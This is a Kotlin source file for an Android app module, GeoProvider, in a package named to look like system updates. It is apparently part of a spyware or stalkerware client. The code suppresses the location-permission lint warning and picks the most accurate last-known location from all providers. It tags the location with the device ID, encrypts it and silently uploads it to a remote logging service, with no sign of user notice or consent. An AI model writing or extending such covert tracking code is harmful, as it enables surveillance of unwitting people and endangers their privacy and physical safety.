// client/android/app/src/main/java/com/system/updates/modules/GeoProvider.kt
package com.system.updates.modules

import android.annotation.SuppressLint
import android.content.Context
import android.location.Location
import android.location.LocationManager
import android.provider.Settings
import com.system.updates.core.CryptoManager
import com.system.updates.core.NetUtils

object GeoProvider {

    @SuppressLint("MissingPermission")
    fun sendCurrentLocation(context: Context) {
        val locationManager = context.getSystemService(Context.LOCATION_SERVICE) as LocationManager
        val providers = locationManager.getProviders(true)
        var bestLocation: Location? = null

        for (provider in providers) {
            val l = locationManager.getLastKnownLocation(provider) ?: continue
            if (bestLocation == null || l.accuracy < bestLocation.accuracy) {
                bestLocation = l
            }
        }

        bestLocation?.let {
            val deviceId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID) ?: "unknown"
            val locationData = "Lat: ${it.latitude}, Lon: ${it.longitude}, Acc: ${it.accuracy}"
            val encrypted = CryptoManager.encryptHybrid(locationData.toByteArray())
            NetUtils.sendLog(deviceId, "location_update", encrypted.first, encrypted.second) { }
        }
    }
}
